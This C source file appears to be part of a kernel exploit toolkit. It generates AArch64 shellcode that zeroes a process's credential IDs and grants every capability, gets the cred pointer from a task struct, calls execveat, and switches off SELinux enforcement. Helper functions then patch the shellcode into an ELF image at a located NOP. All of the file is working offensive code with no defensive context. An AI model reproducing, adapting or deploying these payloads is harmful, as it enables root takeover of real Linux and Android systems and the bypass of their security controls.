#include <stdint.h>
#include <string.h>

#include "ic_compat.h"
#include "ic_target.h"

#define IC_SC_MAX 512

struct ic_sc_output {
	unsigned char bytes[IC_SC_MAX];
	size_t len;
};

static void ic_emit_u32(struct ic_sc_output *o, uint32_t insn)
{
	if (o->len + 4 > IC_SC_MAX)
		return;
	memcpy(&o->bytes[o->len], &insn, 4);
	o->len += 4;
}

static void ic_emit_movz(struct ic_sc_output *o, unsigned int rd,
			 unsigned int imm16, unsigned int shift)
{
	ic_emit_u32(o, 0xd2800000U | ((shift & 3U) << 21) |
			   ((imm16 & 0xffffU) << 5) | (rd & 0x1fU));
}

static void ic_emit_movk(struct ic_sc_output *o, unsigned int rd,
			 unsigned int imm16, unsigned int shift)
{
	ic_emit_u32(o, 0xf2800000U | ((shift & 3U) << 21) |
			   ((imm16 & 0xffffU) << 5) | (rd & 0x1fU));
}

static void ic_emit_mov_x(struct ic_sc_output *o, unsigned int rd, uint64_t v)
{
	ic_emit_movz(o, rd, (unsigned int)(v & 0xffffU), 0);
	ic_emit_movk(o, rd, (unsigned int)((v >> 16) & 0xffffU), 1);
	ic_emit_movk(o, rd, (unsigned int)((v >> 32) & 0xffffU), 2);
	ic_emit_movk(o, rd, (unsigned int)((v >> 48) & 0xffffU), 3);
}

static void ic_emit_mov_w(struct ic_sc_output *o, unsigned int rd, uint32_t v)
{
	ic_emit_u32(o, 0x52800000U | (((v >> 16) & 0xffffU) << 5) | (rd & 0x1fU));
	ic_emit_u32(o, 0x72a00000U | ((v & 0xffffU) << 5) | (rd & 0x1fU));
}

static void ic_emit_str_x(struct ic_sc_output *o, unsigned int rt,
			  unsigned int rn, unsigned int offset)
{
	ic_emit_u32(o, 0xf9000000U | (((offset >> 3) & 0xfffU) << 10) |
			   ((rn & 0x1fU) << 5) | (rt & 0x1fU));
}

static void ic_emit_str_w(struct ic_sc_output *o, unsigned int rt,
			  unsigned int rn, unsigned int offset)
{
	ic_emit_u32(o, 0xb9000000U | (((offset >> 2) & 0xfffU) << 10) |
			   ((rn & 0x1fU) << 5) | (rt & 0x1fU));
}

static void ic_emit_ldr_x(struct ic_sc_output *o, unsigned int rt,
			  unsigned int rn, unsigned int offset)
{
	ic_emit_u32(o, 0xf9400000U | (((offset >> 3) & 0xfffU) << 10) |
			   ((rn & 0x1fU) << 5) | (rt & 0x1fU));
}

static void ic_emit_svc(struct ic_sc_output *o)
{
	ic_emit_u32(o, 0xd4000001U);
}

static void ic_emit_ret(struct ic_sc_output *o)
{
	ic_emit_u32(o, 0xd65f03c0U);
}

static void ic_sc_call_syscall(struct ic_sc_output *o, uint32_t nr)
{
	ic_emit_mov_w(o, 8, nr);
	ic_emit_svc(o);
}

size_t ic_build_cred_zero_payload(struct ic_sc_output *o, uint64_t cred_addr)
{
	const unsigned int x0 = 0;

	o->len = 0;
	ic_emit_mov_x(o, x0, cred_addr);
	ic_emit_mov_w(o, 1, 0);
	ic_emit_str_w(o, 1, x0, OFF_CRED_UID);
	ic_emit_str_w(o, 1, x0, OFF_CRED_GID);
	ic_emit_str_w(o, 1, x0, OFF_CRED_EUID);
	ic_emit_str_w(o, 1, x0, OFF_CRED_EGID);
	ic_emit_str_w(o, 1, x0, OFF_CRED_SUID);
	ic_emit_str_w(o, 1, x0, OFF_CRED_SGID);
	ic_emit_str_w(o, 1, x0, OFF_CRED_FSUID);
	ic_emit_str_w(o, 1, x0, OFF_CRED_FSGID);
	ic_emit_mov_x(o, 2, ~0ULL);
	ic_emit_str_x(o, 2, x0, OFF_CRED_CAP_INHERITABLE);
	ic_emit_str_x(o, 2, x0, OFF_CRED_CAP_PERMITTED);
	ic_emit_str_x(o, 2, x0, OFF_CRED_CAP_EFFECTIVE);
	ic_emit_ret(o);
	return o->len;
}

size_t ic_build_cred_write_from_task(struct ic_sc_output *o, uint64_t task_addr)
{
	const unsigned int x9 = 9;
	const unsigned int x10 = 10;

	o->len = 0;
	ic_emit_mov_x(o, x9, task_addr);
	ic_emit_ldr_x(o, x10, x9, OFF_TASK_STRUCT_CRED);
	ic_emit_mov_w(o, 1, 0);
	ic_emit_str_w(o, 1, x10, OFF_CRED_UID);
	ic_emit_str_w(o, 1, x10, OFF_CRED_GID);
	ic_emit_str_w(o, 1, x10, OFF_CRED_EUID);
	ic_emit_str_w(o, 1, x10, OFF_CRED_EGID);
	ic_emit_str_w(o, 1, x10, OFF_CRED_SUID);
	ic_emit_str_w(o, 1, x10, OFF_CRED_SGID);
	ic_emit_mov_x(o, 2, ~0ULL);
	ic_emit_str_x(o, 2, x10, OFF_CRED_CAP_INHERITABLE);
	ic_emit_str_x(o, 2, x10, OFF_CRED_CAP_PERMITTED);
	ic_emit_str_x(o, 2, x10, OFF_CRED_CAP_EFFECTIVE);
	ic_emit_ret(o);
	return o->len;
}

size_t ic_build_execveat_payload(struct ic_sc_output *o, uint64_t argv_addr,
				 uint64_t envp_addr, uint32_t sys_execveat)
{
	o->len = 0;
	ic_emit_mov_x(o, 0, AT_EMPTY_PATH);
	ic_emit_mov_x(o, 1, argv_addr);
	ic_emit_mov_x(o, 2, envp_addr);
	ic_emit_mov_x(o, 3, 0);
	ic_sc_call_syscall(o, sys_execveat);
	ic_emit_ret(o);
	return o->len;
}

size_t ic_build_selinux_disable_payload(struct ic_sc_output *o,
					uint64_t enforcing_addr)
{
	o->len = 0;
	ic_emit_mov_x(o, 0, enforcing_addr);
	ic_emit_mov_w(o, 1, 0);
	ic_emit_str_w(o, 1, 0, 0);
	ic_emit_ret(o);
	return o->len;
}

int ic_patch_elf_entry_at(unsigned char *image, size_t image_len,
			  const struct ic_sc_output *sc, size_t entry_off)
{
	if (image_len < 64)
		return -1;
	if (image[0] != 0x7f || image[1] != 'E' || image[2] != 'L' ||
	    image[3] != 'F')
		return -1;
	if (image[4] != 2)
		return -1;
	if (entry_off < 4 || entry_off + sc->len > image_len)
		return -1;
	memcpy(image + entry_off, sc->bytes, sc->len);
	ic_cache_flush(image + entry_off, sc->len);
	return 0;
}

int ic_elf_entry_offset(const unsigned char *image, size_t image_len,
			size_t *entry_off)
{
	size_t i = 4;

	if (image_len < 64 || image[4] != 2)
		return -1;
	while (i + 4 <= image_len) {
		if (image[i] == 0x1f && image[i + 1] == 0x20 &&
		    image[i + 2] == 0x03 && image[i + 3] == 0xd5) {
			*entry_off = i;
			return 0;
		}
		i += 4;
	}
	return -1;
}

int ic_patch_elf_entry_auto(unsigned char *image, size_t image_len,
			    const struct ic_sc_output *sc)
{
	size_t off;

	if (ic_elf_entry_offset(image, image_len, &off))
		return -1;
	return ic_patch_elf_entry_at(image, image_len, sc, off);
}